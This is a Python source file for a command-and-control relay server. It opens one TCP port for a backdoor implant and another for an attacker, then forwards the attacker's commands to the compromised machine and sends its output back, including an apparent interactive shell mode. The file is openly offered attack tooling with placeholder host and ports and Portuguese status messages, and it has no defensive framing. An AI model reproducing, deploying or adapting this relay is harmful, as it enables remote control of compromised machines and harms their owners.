import socket
from time import sleep

# Sets the IP address and ports on which the server will wait for the connection
SERVER = 'SERVER_IP'
PORT1 = SERVER_PORT1   # Backdoor
PORT2 = SERVER_PORT2   # Attacker

# Creates the TCP sockets
sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Backdoor
sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Attacker

# Associates the sockets with the specified IP addresses and ports
sock1.bind((SERVER, PORT1))
sock2.bind((SERVER, PORT2))

# Waits for the backdoor connection
sock1.listen(1)
print(">>> Aguardando conexão do backdoor... <<<")

# Accepts the connection and gets the socket object from the established connection
conn1, addr1 = sock1.accept()
print(">>> Conexão estabelecida com backdoor:", addr1, "<<<")

# Waits for the attacker connection
sock2.listen(1)
print(">>> Aguardando conexão do atacante... <<<")

# Accepts the connection and gets the socket object from the established connection
conn2, addr2 = sock2.accept()
print(">>> Conexão estabelecida com atacante:", addr2, "<<<")

msg = "".encode('utf-8')

# Main loop for sending and receiving messages
while True:
    data2 = conn2.recv(1024)
    if not data2:
        # If there is no data, the connection has been terminated
        break
    elif data2.decode('utf-8').strip().rstrip('\n\x00') == "1":
        conn1.sendall(data2)
        while True:
            data2 = conn2.recv(1024)            
            if not data2:
                # If there is no data, the connection has been terminated
                break
            if data2.decode('utf-8').strip().rstrip('\n\x00') == "quit":
                conn1.sendall(data2)
                break
            conn1.sendall(data2)
            msg = "".encode('utf-8')
            while True:
                data1 = conn1.recv(1024)
                if not data1:
                    # If there is no data, the connection has been terminated
                    break
                elif data1.decode('utf-8') == "END\n\x00":
                    # Message ending
                    msg += data1
                    conn2.sendall(msg)
                    break
                elif data1.decode('utf-8').endswith("\x00END\n\x00"):
                    # Message ending
                    msg += data1
                    conn2.sendall(msg)
                    break
                msg += data1
        continue
    elif data2.decode('utf-8').strip().rstrip('\n\x00') == "3":
        conn1.sendall(data2)
        data2 = conn2.recv(1024)
        if not data2:
            # If there is no data, the connection has been terminated
            break
        conn1.sendall(data2)
    elif data2.decode('utf-8').strip().rstrip('\n\x00') == "4":
        conn1.sendall(data2)
        data1 = conn1.recv(1024)
        if not data1:
            # If there is no data, the connection has been terminated
            break
        conn2.sendall(data1)
        continue
    else:
        conn1.sendall(data2)
    while True:
        data1 = conn1.recv(1024)
        if not data1:
            # If there is no data, the connection has been terminated
            break
        elif data1.decode('utf-8') == "END\n\x00":
            # Message ending
            msg = data1
            conn2.sendall(msg)
            break
        elif data1.decode('utf-8').endswith("\x00END\n\x00"):
            # Message ending
            msg = data1
            conn2.sendall(msg)
            break
        msg = data1
        conn2.sendall(msg)

sleep(1)

# Close the connections and the sockets
conn2.close()
sock2.close()
conn1.close()
sock1.close()
